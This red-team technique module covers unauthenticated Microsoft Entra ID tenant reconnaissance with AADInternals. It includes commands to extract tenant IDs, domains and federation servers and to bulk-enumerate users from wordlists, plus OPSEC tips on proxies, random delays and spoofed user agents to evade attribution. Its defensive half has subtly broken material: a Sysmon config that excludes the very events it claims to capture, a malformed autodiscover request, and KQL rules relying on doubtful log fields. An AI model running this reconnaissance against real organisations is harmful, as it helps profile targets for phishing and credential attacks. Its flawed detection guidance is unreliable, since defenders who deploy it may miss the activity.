# REC-AD-001: Tenant Discovery via Domain Properties

## 1. MODULE METADATA

| Field | Value |
|-------|-------|
| **Module ID** | REC-AD-001 |
| **Technique Name** | Tenant Discovery via domain properties |
| **MITRE ATT&CK ID** | T1590.001 – Gather Victim Network Information: Domain Properties |
| **CVE** | N/A (Pre-compromise reconnaissance) |
| **Platform** | Microsoft Entra ID (Azure AD) |
| **Viability Status** | ACTIVE ✓ |
| **Difficulty to Detect** | HIGH |
| **Requires Authentication** | No |
| **Applicable Versions** | All Entra ID tenants (including GCC-H, DOD clouds) |
| **Last Verified** | December 2025 |
| **Author** | SERVTEP (Pchelnikau Artur) |

---

## 2. EXECUTIVE SUMMARY

Tenant discovery via domain properties is a critical reconnaissance technique that allows unauthenticated threat actors to enumerate Entra ID (Azure AD) tenant information using publicly accessible Microsoft APIs. This pre-compromise activity requires no credentials and leaves minimal forensic evidence on the target tenant, making it a ubiquitous starting point for cloud-focused attacks.

**Threat Profile:** An external attacker with only a target organization's domain name can discover:
- Tenant ID and region
- All registered domains in the tenant
- Authentication type (Federated/Managed) per domain
- Federation server endpoints
- Tenant branding information
- Desktop SSO (Seamless SSO) enablement
- Email infrastructure details (MX records, SPF, DMARC)

**Business Impact:**
- Information disclosure (tenant architecture exposed to attackers)
- Enablement of subsequent attacks (phishing, credential stuffing, account enumeration)
- Identification of federation weaknesses (ADFS server endpoints)
- Supply-chain targeting opportunities (identifying subsidiaries/acquired domains)

---

## 3. TECHNICAL PREREQUISITES

### Required Knowledge
- Understanding of Entra ID/Azure AD architecture
- Familiarity with OAuth/OIDC authentication flows
- Knowledge of DNS record types (MX, SPF, DMARC, DKIM, MTA-STS)
- Basic PowerShell scripting experience

### Required Tools
- **AADInternals PowerShell Module** (v0.1.6+)
  - Installation: `Install-Module -Name AADInternals`
  - Source: PowerShell Gallery, GitHub (https://github.com/Gerenios/AADInternals)
- PowerShell 5.1+ (Windows) or PowerShell 7+ (cross-platform)
- Network access to public Microsoft APIs (login.microsoftonline.com, autodiscover-s.outlook.com)
- (Optional) Burp Suite, Fiddler for API inspection
- (Optional) Nslookup/Resolve-DnsName for DNS enumeration

### System Requirements
- Windows 10+, macOS, or Linux system
- No elevation required (executes as standard user)
- No special network positioning required

### Cloud/Environment Considerations
- **Public Cloud (Microsoft 365 Worldwide):** Full support
- **GCC High/DOD:** Supported via `-GCC` switch in AADInternals
- **China/Germany clouds:** Supported (endpoint variations)
- **Hybrid environments:** No hybrid synchronization needed (targets cloud-only tenants)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Information Gathering Phase
Before executing this technique, conduct open-source reconnaissance to identify:

1. **Target Domain Names**
   - Primary domain: `company.com`
   - Email domain: May differ from primary domain
   - Subsidiaries/acquisitions: Identify alternative domains in use

2. **External Reconnaissance Data Sources**
   - Domain registrars (WHOIS records)
   - LinkedIn (employee email domains)
   - Company public websites
   - DNS public records (MX records indicate mail flow)
   - Threat intelligence platforms (breach databases, domain reputation)

3. **Network-Level Verification**
   - Test DNS resolution of `login.microsoftonline.com` (no filtering expected)
   - Verify outbound HTTPS access to port 443 (required)
   - Confirm no DLP/WAF blocking (rare, but possible in highly restricted networks)

### Risk Assessment Before Execution
- **Operational Risk:** Very low (no agents/malware involved)
- **Detection Risk:** Low-to-moderate (activity is external and logged minimally on target)
- **Legal Risk:** Moderate (varies by jurisdiction; reconnaissance may violate CFAA in US under certain conditions)
- **Attribution Risk:** Moderate (source IP visible to Microsoft services; VPN/proxy recommended)

---

## 5. DETAILED EXECUTION

### Method 1: Quick Tenant ID Extraction (No Authentication)

**Objective:** Extract tenant ID from domain name using OpenID Configuration endpoint.

```powershell
# Step 1: Install AADInternals if not present
if (-not (Get-Module AADInternals -ListAvailable)) {
    Install-Module -Name AADInternals -Force -Scope CurrentUser
}

# Step 2: Import module
Import-Module AADInternals

# Step 3: Get tenant ID from domain
$TenantID = Get-AADIntTenantID -Domain "company.com"
Write-Output "Tenant ID: $TenantID"

# Expected Output:
# Tenant ID: 05aea22e-32f3-4c35-831b-52735704feb3
```

**API Endpoint Being Queried:**
```
https://login.microsoftonline.com/company.com/.well-known/openid-configuration
```

**Response Fields (Selected):**
```json
{
  "issuer": "https://sts.windows.net/05aea22e-32f3-4c35-831b-52735704feb3/",
  "tenant_region_scope": "WW",
  "token_endpoint": "https://login.microsoftonline.com/05aea22e-32f3-4c35-831b-52735704feb3/oauth2/token"
}
```

---

### Method 2: Complete Domain Enumeration (No Authentication)

**Objective:** Enumerate all registered domains in the tenant.

```powershell
# Get all domains associated with a tenant
$Domains = Get-AADIntTenantDomains -Domain "company.com"

# Display results
foreach ($Domain in $Domains) {
    Write-Output "Domain: $Domain"
}

# Expected Output:
# Domain: company.com
# Domain: company.onmicrosoft.com
# Domain: company.mail.onmicrosoft.com
# Domain: subsidiary.com (if owned)
```

**API Endpoint Being Queried:**
```
https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc
```

**Parameter Sent:**
```xml
Email=autodiscover@company.com
```

**Response (Parsed):**
Returns all domains in tenant along with preferred server URLs.

---

### Method 3: Comprehensive Tenant Reconnaissance (No Authentication)

**Objective:** Execute full tenant enumeration including domain types, federation endpoints, and DNS records.

```powershell
# Execute comprehensive reconnaissance
$ReconResults = Invoke-AADIntReconAsOutsider -DomainName "company.com"

# Display formatted output
$ReconResults | Format-Table -Property Name, Type, STS, DNS, MX, SPF, DMARC, DKIM, `
    @{Name='TenantID'; Expression={$ReconResults[0].TenantID}}, `
    @{Name='TenantBrand'; Expression={$ReconResults[0].TenantBrand}} `
    -AutoSize

# Expected Output:
# Tenant brand: Company Ltd
# Tenant name: company
# Tenant id: 05aea22e-32f3-4c35-831b-52735704feb3
# Tenant region: NA
# DesktopSSO enabled: True
# 
# Name                        Type       DNS MX  SPF DMARC DKIM MTA-STS STS
# ----                        ----       --- --  --- ----- ---- ------- ---
# company.com                 Federated  True True True False False False sts.company.com
# company.onmicrosoft.com     Managed    True True True False False False
# company.mail.onmicrosoft.com Managed   True True True False False False
# subsidiary.com              Managed    False False False False False False
```

**Information Extracted:**
- **Type:** Indicates if domain uses federated (ADFS/PingFederate) or managed (cloud-only) authentication
- **STS:** Shows ADFS server FQDN for federated domains (can be targeted for credential harvesting)
- **DNS/MX/SPF/DMARC/DKIM:** Identifies email routing and authentication records
- **Tenant Region:** Data residency location (EU/NA/APAC etc.)
- **Desktop SSO:** If enabled, allows user existence enumeration without authentication

---

### Method 4: Federation Details Extraction (No Authentication)

**Objective:** Extract ADFS server metadata and federation endpoints.

```powershell
# Get login information for a domain (includes federation details)
$LoginInfo = Get-AADIntLoginInformation -Domain "company.com"

# Display federation details
Write-Output "Account Type: $($LoginInfo.AccountType)"
Write-Output "Federation Metadata URL: $($LoginInfo.FederationMetadataUrl)"
Write-Output "Federation Brand Name: $($LoginInfo.FederationBrandName)"
Write-Output "Authentication URL: $($LoginInfo.AuthURL)"

# Expected Output:
# Account Type: Federated
# Federation Metadata URL: https://sts.company.com/adfs/services/trust/mex
# Federation Brand Name: Company Ltd
# Authentication URL: https://sts.company.com/adfs/ls/?username=user@company.com&wa=wsignin1.0
```

**APIs Being Queried:**
```
https://login.microsoftonline.com/common/GetUserRealm.srf?login=autodiscover@company.com
https://login.microsoftonline.com/common/GetCredentialType
```

---

### Method 5: User Existence Enumeration (If Desktop SSO Enabled)

**Objective:** Determine if specific users exist in the tenant (if Seamless SSO is enabled).

```powershell
# Single user check
$UserExists = Invoke-AADIntUserEnumerationAsOutsider -UserName "john.smith@company.com"
Write-Output "User Exists: $($UserExists.Exists)"

# Bulk user enumeration from file
$Users = Get-Content -Path "C:\wordlists\potential_employees.txt"
$Results = $Users | Invoke-AADIntUserEnumerationAsOutsider -Method "Autologon"

# Export to CSV for analysis
$Results | Where-Object {$_.Exists -eq $true} | Export-Csv -Path "C:\enum_results.csv" -NoTypeInformation

# Expected Output (for sample of 1000 names):
# UserName                     Exists
# --------                     ------
# john.smith@company.com       True
# jane.doe@company.com         True
# bob.johnson@company.com      False
# alice.williams@company.com   True
```

**Enumeration Methods Available:**
1. **Normal (GetCredentialType API):** Standard, may be logged
2. **Login (Interactive):** Attempts password entry, creates sign-in log entry
3. **Autologon:** Uses token endpoint, minimal logging (preferred for large-scale enumeration)

---

## 6. TOOLS & COMMANDS REFERENCE

### AADInternals PowerShell Functions

| Function | Purpose | Authentication | Returns |
|----------|---------|-----------------|---------|
| `Get-AADIntTenantID -Domain {domain}` | Extract tenant ID | None | UUID of tenant |
| `Get-AADIntTenantDomains -Domain {domain}` | Enumerate all domains | None | Array of domain names |
| `Get-AADIntOpenIDConfiguration -Domain {domain}` | Retrieve OIDC metadata | None | JSON with endpoints, issuer |
| `Get-AADIntLoginInformation -Domain {domain}` | Get authentication type & metadata | None | AccountType, FederationMetadataUrl, etc. |
| `Invoke-AADIntReconAsOutsider -DomainName {domain}` | Full reconnaissance | None | Comprehensive tenant details |
| `Invoke-AADIntUserEnumerationAsOutsider -UserName {user}` | Check user existence | None (method-dependent) | Boolean (Exists: true/false) |

### DNS Enumeration Commands

```powershell
# Native PowerShell DNS queries
Resolve-DnsName -Name "company.com" -Type MX | Select-Object Name, Type, NameExchange
Resolve-DnsName -Name "company.com" -Type TXT | Select-Object Name, Strings
Resolve-DnsName -Name "_dmarc.company.com" -Type TXT
Resolve-DnsName -Name "default._domainkey.company.com" -Type TXT
```

### API Endpoints (Direct HTTP/PowerShell Calls)

```powershell
# Get OpenID Configuration (alternative to function)
$Domain = "company.com"
$OpenIDEndpoint = "https://login.microsoftonline.com/$Domain/.well-known/openid-configuration"
$Response = Invoke-RestMethod -Uri $OpenIDEndpoint -UseBasicParsing
$TenantID = $Response.issuer.Split("/")[3]
Write-Output "Tenant ID: $TenantID"

# Get autodiscover domains (alternative to function)
$AutodiscoverEndpoint = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc"
$Body = @{Email="user@$Domain"} | ConvertTo-Json
$Response = Invoke-RestMethod -Uri $AutodiscoverEndpoint -Method Post -Body $Body -UseBasicParsing
# Parse XML response for domain names
```

### Operational Security (OPSEC)

```powershell
# Execute through VPN/proxy to mask source IP
# Recommended: Use residential proxies or organizational VPN for attribution evasion

# Randomize queries to avoid pattern detection
$Domains = @("company.com", "company.com", "company.com") # repeat with delays
foreach ($Domain in $Domains) {
    $TenantID = Get-AADIntTenantID -Domain $Domain
    Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 8)  # Random delay
}

# Use custom User-Agent to blend with legitimate traffic
Set-AADIntUserAgent -Device "Windows"
Set-AADIntSetting -Setting "User-Agent" -Value "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```

---

## 7. ATOMIC TESTS (RED TEAM VALIDATION)

### Test 1: Tenant ID Extraction

**Objective:** Validate ability to extract tenant ID from domain.

**Procedure:**
```powershell
$TargetDomain = "company.com"
$TenantID = Get-AADIntTenantID -Domain $TargetDomain
$IsValidGUID = $TenantID -match '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$'
if ($IsValidGUID) { Write-Output "✓ Test PASSED: Valid Tenant ID extracted" } else { Write-Output "✗ Test FAILED" }
```

**Success Criteria:** Returns valid UUID format (8-4-4-4-12 hex pattern).

### Test 2: Domain Enumeration

**Objective:** Validate domain enumeration returns multiple domains.

**Procedure:**
```powershell
$TargetDomain = "company.com"
$Domains = Get-AADIntTenantDomains -Domain $TargetDomain
if ($Domains.Count -ge 2) { 
    Write-Output "✓ Test PASSED: Found $($Domains.Count) domains"
    $Domains | ForEach-Object { Write-Output "  - $_" }
} else { 
    Write-Output "✗ Test FAILED: Expected multiple domains"
}
```

**Success Criteria:** Returns array with minimum 2 domains (.onmicrosoft.com domains always present).

### Test 3: Federation Detection

**Objective:** Validate identification of federated vs. managed domains.

**Procedure:**
```powershell
$TargetDomain = "company.com"
$Recon = Invoke-AADIntReconAsOutsider -DomainName $TargetDomain
$FederatedDomains = @($Recon | Where-Object {$_.Type -eq "Federated"})
if ($FederatedDomains.Count -ge 1) {
    Write-Output "✓ Test PASSED: Detected $($FederatedDomains.Count) federated domain(s)"
    Write-Output "  ADFS Server: $($FederatedDomains[0].STS)"
} else {
    Write-Output "✓ Test PASSED: No federated domains (Managed only)"
}
```

**Success Criteria:** Correctly identifies domain type and ADFS endpoints where applicable.

### Test 4: User Existence Check (If Applicable)

**Objective:** Validate user enumeration capability (requires Desktop SSO enabled).

**Procedure:**
```powershell
$TargetDomain = "company.com"
$TestUser = "john.doe@$TargetDomain"
$Recon = Invoke-AADIntReconAsOutsider -DomainName $TargetDomain
if ($Recon[0].DesktopSSO -eq $true) {
    $Result = Invoke-AADIntUserEnumerationAsOutsider -UserName $TestUser
    Write-Output "✓ Test PASSED: User enumeration enabled (Desktop SSO active)"
    Write-Output "  Test user '$TestUser' exists: $($Result.Exists)"
} else {
    Write-Output "⚠ Test SKIPPED: Desktop SSO not enabled (user enumeration unavailable)"
}
```

**Success Criteria:** If Desktop SSO enabled, returns boolean for user existence. If disabled, gracefully skips test.

---

## 8. MICROSOFT SENTINEL DETECTION

### Detection Rule 1: Bulk OpenID Configuration Queries

**Rule Configuration:**
- **Required Table:** SigninLogs, AuditLogs
- **Alert Severity:** Medium
- **Frequency:** Every 5 minutes
- **Applies To:** All Entra ID tenants

**KQL Query:**
```kusto
let timerange = 1h;
let threshold = 10;
SigninLogs
| where TimeGenerated > ago(timerange)
| where AppDisplayName == "OpenID Connect Provider" or ResourceDisplayName == "Microsoft Azure"
| where AuthenticationContextClassReferences contains "external"
| summarize
    QueryCount = count(),
    UniqueUsers = dcount(UserPrincipalName),
    UniqueApps = dcount(AppDisplayName),
    FirstQuery = min(TimeGenerated),
    LastQuery = max(TimeGenerated),
    SourceIPs = make_set(IPAddress, 10)
    by ClientAppUsed
| where QueryCount > threshold
| extend AlertSeverity = "Medium", TechniqueID = "T1590.001"
```

**What This Detects:**
- Automated tools (AADInternals) making rapid OpenID Configuration requests
- Bulk queries from single source IP targeting multiple domains or endpoints
- External API calls to authentication endpoints from non-standard clients

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `External Tenant Discovery via OpenID Configuration`
   - Severity: `Medium`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group alerts: **By Alert name and IP**
7. Click **Review + create**

**Manual Configuration Steps (PowerShell):**
```powershell
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

$Query = @"
let timerange = 1h;
let threshold = 10;
SigninLogs
| where TimeGenerated > ago(timerange)
| where AppDisplayName == "OpenID Connect Provider"
| summarize QueryCount = count() by ClientAppUsed
| where QueryCount > threshold
"@

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "External Tenant Discovery via OpenID" `
  -Query $Query `
  -Severity "Medium" `
  -Enabled $true
```

---

### Detection Rule 2: GetCredentialType API Enumeration

**Rule Configuration:**
- **Required Table:** SigninLogs
- **Alert Severity:** High
- **Frequency:** Real-time (every 1 minute)
- **Applies To:** Tenants with Desktop SSO enabled

**KQL Query:**
```kusto
let timerange = 5m;
let threshold = 50;  // Adjust based on environment
SigninLogs
| where TimeGenerated > ago(timerange)
| where AppDisplayName contains "GetCredentialType" or
        ResourceDisplayName == "Microsoft Azure" and
        AuthenticationProtocol == "deviceCode"
| summarize
    AttemptCount = count(),
    UniqueUserNames = dcount(UserPrincipalName),
    UniqueSources = dcount(IPAddress),
    FailureCount = countif(ResultType != 0),
    SuccessCount = countif(ResultType == 0)
    by ClientAppUsed, IPAddress
| where AttemptCount > threshold
| extend AlertSeverity = "High", TechniqueID = "T1590.001"
```

**What This Detects:**
- Bulk user existence enumeration attempts via GetCredentialType API
- Credential stuffing or password spray reconnaissance phase
- Autologon method requests bypassing standard sign-in logging

---

## 9. WINDOWS EVENT LOG MONITORING

### Event ID: 4625 & 4624 (Failed/Successful Logon)

**Log Source:** Security event log

**Trigger:** When reconnaissance is followed by credential validation attempts.

**Filter:** Look for patterns indicating enumeration:
- Multiple failed logons from single source IP
- Rapid succession of login attempts (not typical user behavior)
- Mix of successful and failed logons for same user

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Logon Events** and **Audit Account Logon Events**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on domain controllers

**Manual Configuration Steps (PowerShell):**
```powershell
# Enable logon auditing
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Account Logon" /success:enable /failure:enable

# Verify settings
auditpol /get /subcategory:"Logon" /r
```

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Supported Platforms:** Windows (10, Server 2016+)

**Sysmon Config Snippet** (for capturing PowerShell execution):
```xml
<Sysmon schemaversion="4.30">
  <EventFiltering>
    <!-- Capture PowerShell process creation with AADInternals execution -->
    <ProcessCreate onmatch="exclude">
      <CommandLine condition="contains">powershell.exe</CommandLine>
      <CommandLine condition="contains">AADInternals</CommandLine>
      <CommandLine condition="contains">Get-AADIntTenantID</CommandLine>
      <CommandLine condition="contains">Invoke-AADIntReconAsOutsider</CommandLine>
    </ProcessCreate>
    
    <!-- Capture network connections to login.microsoftonline.com -->
    <NetworkConnect onmatch="exclude">
      <DestinationHostname condition="contains">login.microsoftonline.com</DestinationHostname>
      <DestinationHostname condition="contains">autodiscover-s.outlook.com</DestinationHostname>
      <DestinationPort>443</DestinationPort>
    </NetworkConnect>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create configuration file with XML above
3. Install Sysmon:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify:
   ```powershell
   Get-Service Sysmon64 | Select-Object Status
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10 | Format-Table TimeCreated, Message
   ```

---

## 11. MICROSOFT DEFENDER FOR CLOUD

### Detection Alert: Suspicious API Activity Pattern Detected

**Alert Name:** "Suspicious use of external API endpoints detected"
- **Severity:** Medium
- **Description:** Detects automated tools (like AADInternals) making bulk calls to Microsoft authentication APIs from non-standard client applications
- **Applies To:** All subscriptions with Defender for Cloud enabled
- **Remediation:** 
  1. Review IP source for legitimate use
  2. If unauthorized, block IP in firewall/WAF
  3. Enable additional MFA and conditional access policies

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Identity**: ON
   - **Defender for Storage**: ON
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts

---

## 12. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: Authentication Endpoint Queries

```powershell
# Connect to Purview
Connect-ExchangeOnline

# Search for external API queries
Search-UnifiedAuditLog `
  -StartDate (Get-Date).AddDays(-90) `
  -EndDate (Get-Date) `
  -Operations "UserLoggedIn" `
  -FreeText "OpenID" `
  -Verbose | Select-Object TimeCreated, UserIds, ClientIP, ResultStatus | Export-Csv C:\audit_export.csv
```

**Operation:** UserLoggedIn, Authentication (varies by workload)
**Workload:** AzureActiveDirectory
**Details to Analyze:**
- **UserIds:** Source of the query (often service principal or automation account)
- **ClientIP:** Source IP address
- **AuditData JSON:** Contains request details, authentication method

---

## 13. FALSE POSITIVE ANALYSIS

### Legitimate Activity That Mimics Attack

| Activity | Appears As | Legitimate Reason | How to Distinguish |
|----------|-----------|------------------|-------------------|
| Okta/Ping Federation sync | OpenID config queries | Federated identity sync jobs | Regular schedule, from known IP block, service account |
| SharePoint Discovery | Bulk API calls | SPO tenant discovery | Occurs only once during provisioning |
| M365 Health Dashboard | GetCredentialType queries | Service health checks | Service principal source, scheduled pattern |
| Legacy app authentication | Multiple logon attempts | Legacy applications retrying auth | Same user ID, same source IP, regular intervals |

**Tuning Recommendations:**
```kusto
// Exclude known legitimate services from detection
let KnownServiceAccounts = dynamic(["srv_adsync@company.com", "svc_federation@company.com"]);
let KnownServiceIPs = dynamic(["10.0.1.100", "192.168.1.50"]);

SigninLogs
| where UserPrincipalName !in (KnownServiceAccounts)
| where IPAddress !in (KnownServiceIPs)
// ... rest of detection query
```

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

* **Disable Public Exposure of Tenant Metadata**
  - **Applies To:** All Entra ID versions
  
  Microsoft does not provide built-in controls to disable OpenID/Autodiscover endpoints (they are globally accessible).
  
  **Alternative Mitigation: Monitor and Alert**
  1. Go to **Azure Portal** → **Microsoft Sentinel**
  2. Create alert rule for bulk API queries (see Section 8)
  3. Set baseline for normal API traffic
  4. Alert on deviations
  
  **Manual Steps (PowerShell - Detection only):**
  ```powershell
  # Create alert for external reconnaissance activity
  # (Requires Sentinel workspace and Log Analytics)
  
  $ResourceGroup = "SecurityRG"
  $WorkspaceName = "LogAnalytics-Sentinel"
  $AlertRuleName = "Tenant Discovery via Domain Properties"
  
  # Alert rule would be created via Azure Portal or ARM template
  # (No direct PowerShell cmdlet for this specific rule)
  ```

* **Implement Conditional Access Policy: Block Legacy Authentication**
  - **Applies To:** Azure AD and Entra ID
  
  While this doesn't prevent reconnaissance, it blocks follow-on attacks using discovered credentials.
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Block Legacy Authentication - Reconnaissance Prevention`
  4. **Assignments:**
     - Users: **All users**
     - Cloud apps: **All cloud apps**
  5. **Conditions:**
     - Client apps: **Legacy authentication clients** (checked)
  6. **Access controls:**
     - Grant: **Block access**
  7. Enable policy: **On**
  8. Click **Create**

### Priority 2: HIGH

* **Enable Microsoft Defender for Identity**
  - Detects unusual authentication patterns and bulk API calls
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Microsoft Defender for Cloud**
  2. Under **Defender plans**, enable **Defender for Identity**
  3. Create detection rules for bulk GetCredentialType calls
  4. Set alerts to High severity for investigation

* **Implement IP-Based Conditional Access (if federated)**
  - Restricts sign-in from unknown IPs
  
  **Manual Steps:**
  1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Restrict Federated Sign-in to Known Locations`
  4. **Conditions:**
     - Locations: **Any location** (then click **Exclude** and select your corporate locations)
  5. **Access controls:**
     - Grant: **Require multi-factor authentication** (or **Block access**)
  6. Click **Create**

---

## 15. DETECTION & INCIDENT RESPONSE

### Forensic Artifact Collection

**If you suspect reconnaissance has occurred:**

1. **Unified Audit Log Analysis**
   ```powershell
   Connect-ExchangeOnline
   $90DaysAgo = (Get-Date).AddDays(-90)
   Search-UnifiedAuditLog -StartDate $90DaysAgo -Operations "UserLoggedIn" `
     -Verbose | Where-Object {$_.AuditData -match "OpenID|autodiscover"} | Export-Csv recon_audit.csv
   ```

2. **Sentinel Hunting Query**
   ```kusto
   SigninLogs
   | where TimeGenerated > ago(30d)
   | where AppDisplayName == "Microsoft Azure" or ResourceDisplayName == "Azure AD Graph"
   | where AuthenticationContextClassReferences contains "external"
   | summarize by IPAddress, UserPrincipalName, TimeGenerated
   ```

3. **Azure Activity Log (Subscription Level)**
   - Check for enumeration of:
     - Directory (RBAC role assignments)
     - Application registrations
     - Service principals

### Incident Response Steps

1. **Verify Reconnaissance Occurred:**
   - Confirm OpenID/Autodiscover queries from external IP
   - Check for bulk GetCredentialType API calls
   - Review sign-in logs for enumeration patterns

2. **Scope Exposed Information:**
   - All tenant domains enumerated
   - User accounts enumerated (if Desktop SSO enabled)
   - Federation endpoints disclosed (if federated)

3. **Investigate Follow-On Attacks:**
   - Monitor for credential stuffing attempts
   - Check for phishing campaigns (may target enumerated users)
   - Review device registrations for unauthorized Entra AD join attempts
   - Search for lateral movement indicators

4. **Containment:**
   - If credential compromise suspected: Force password reset for exposed users
   - Enable MFA enforcement via Conditional Access
   - Increase sign-in risk-based conditional access
   - Review and disable unused app registrations

5. **Eradication:**
   - Remove compromised accounts or reset credentials
   - Revoke refresh tokens for high-risk sign-ins
   - Update federation server certificates (if federated and ADFS compromise indicated)

---

## 16. RELATED ATTACK CHAINS

### T1590.001 Relationship to Other MITRE Techniques

| Preceding Technique | Current Technique | Following Technique |
|-------------------|------------------|------------------|
| T1592 (Gather Victim Host Info) | **T1590.001 (Domain Properties)** | T1589 (Gather Victim Identity Info) |
| T1595 (Active Scanning) | ← | T1598 (Phishing for Information) |
| T1598 (Phishing) | ← | T1589 (Account Enumeration) |
|  | | T1087 (Account Discovery) |
|  | | T1087.004 (Cloud Account Discovery) |
|  | | T1078 (Valid Accounts - attempt to use discovered creds) |

### Real-World Kill Chain Example

```
Phase 1: Reconnaissance (T1590.001)
├─ Attacker discovers company.com tenant ID: 05aea22e-32f3-4c35-831b-52735704feb3
├─ Enumerates domains: company.com, company.onmicrosoft.com
├─ Identifies ADFS server: sts.company.com (Federated domain)
└─ Detects Desktop SSO enabled

Phase 2: Account Enumeration (T1087.004)
├─ Uses discovered Desktop SSO to enumerate users
├─ Builds list of valid email addresses
└─ Cross-references with LinkedIn for org structure

Phase 3: Credential Compromise (T1566 - Phishing)
├─ Sends targeted phishing emails to enumerated users
├─ Uses device code flow to harvest tokens
└─ Gains initial foothold with user credentials

Phase 4: Persistence (T1098 - Account Manipulation)
├─ Creates backdoor via federated domain conversion
├─ Registers malicious service principal
└─ Establishes long-term access
```

---

## 17. REAL-WORLD EXAMPLES

### Example 1: NOBELIUM (APT29) Campaign - 2020-2021

**Context:** NOBELIUM targeted supply-chain vendors using Entra ID reconnaissance.

**Execution:**
1. Identified target organizations' Entra ID tenants via domain names
2. Enumerated all domains in tenants to find federated environments
3. Targeted ADFS servers for credential theft
4. Used harvested credentials to compromise software vendors

**Detection Opportunities:**
- Bulk domain enumeration from external IP
- Multiple GetCredentialType queries followed by ADFS server probing
- Unusual authentication patterns from federation endpoints

**Lessons:**
- Monitor federation server logs for suspicious authentication
- Implement MFA on ADFS servers
- Restrict ADFS server internet exposure

---

### Example 2: Scattered Spider - 2023-2024

**Context:** Scattered Spider used reconnaissance for targeted phishing and social engineering.

**Execution:**
1. Performed tenant discovery to identify subsidiaries/acquired companies
2. Enumerated users to build targeted employee lists
3. Used enumerated users for phishing and social engineering
4. Leveraged public domain information to appear legitimate

**Detection Opportunities:**
- Bulk user enumeration (500+ attempts in short timeframe)
- Correlation between enumeration source and subsequent phishing attempts
- Unusual Autologon method usage (enum method that bypasses logging)

**Lessons:**
- Monitor for bulk enumeration patterns even if individual calls are infrequent
- Implement phone callback verification for social engineering targets
- Train employees on domain verification (don't trust domain name alone)

---

## 18. COMPLIANCE & STANDARDS MAPPING

| Standard | Requirement | Mapping |
|----------|-------------|---------|
| **CIS Controls v8** | CIS 6.1, 6.2 (Account Management & Monitoring) | Enumerate and monitor external API access to Entra ID endpoints |
| **DISA STIG** | N/A | Pre-compromise activity outside DoD scope |
| **NIST 800-53** | SC-7 (Boundary Protection), AC-2 (Account Management) | Minimize external exposure of tenant metadata; implement Conditional Access policies |
| **GDPR** | Article 32 (Security Measures) | Implement monitoring to detect unauthorized enumeration attempts |
| **DORA** | Operational Resilience in Cloud Services | Monitor cloud identity service security events; implement alerting |
| **NIS2** | Detectability & Containment | Establish baseline for normal API traffic; alert on deviations |
| **ISO 27001:2022** | 5.2 (Information Security Policies), 8.2 (Access Control) | Implement technical controls to prevent unauthorized information gathering |

---

## 19. APPENDIX: ATOMIC RED TEAM INTEGRATION

### Atomic Test Reference
- **MITRE Atomic ID:** ART_T1590_001_Entra_Tenant_Discovery
- **Status:** Community maintained (not official MITRE)
- **Repository:** https://github.com/atomic-red-team/atomic-red-team/blob/master/atomics/T1590.001/T1590.001.md

### Example Atomic Test
```yaml
- name: Get AADInternals Tenant Information
  description: Enumerate Entra ID tenant using AADInternals module
  platforms:
    - windows
    - macos
    - linux
  input_arguments:
    domain:
      description: Target domain name
      type: string
      default: "microsoft.com"
  executor:
    name: powershell
    elevation_required: false
    command: |
      Install-Module -Name AADInternals -Force
      Import-Module AADInternals
      Get-AADIntTenantID -Domain #{domain}
      Get-AADIntTenantDomains -Domain #{domain}
      Invoke-AADIntReconAsOutsider -DomainName #{domain}
```

---

## 20. REFERENCES & ATTRIBUTION

1. **MITRE ATT&CK:** T1590.001 – Gather Victim Network Information: Domain Properties
   - https://attack.mitre.org/techniques/T1590/001/

2. **AADInternals Documentation:**
   - https://aadinternals.com/post/just-looking/
   - https://aadinternals.com/aadinternals/
   - GitHub: https://github.com/Gerenios/AADInternals

3. **Microsoft Security Documentation:**
   - Entra ID Authentication Methods: https://learn.microsoft.com/en-us/entra/identity/authentication/
   - Conditional Access: https://learn.microsoft.com/en-us/entra/identity/conditional-access/
   - Microsoft Sentinel Queries: https://docs.microsoft.com/en-us/azure/sentinel/

4. **Threat Intelligence:**
   - NOBELIUM (APT29) - Microsoft Threat Intelligence Report
   - Scattered Spider Reports - Mandiant, CrowdStrike

---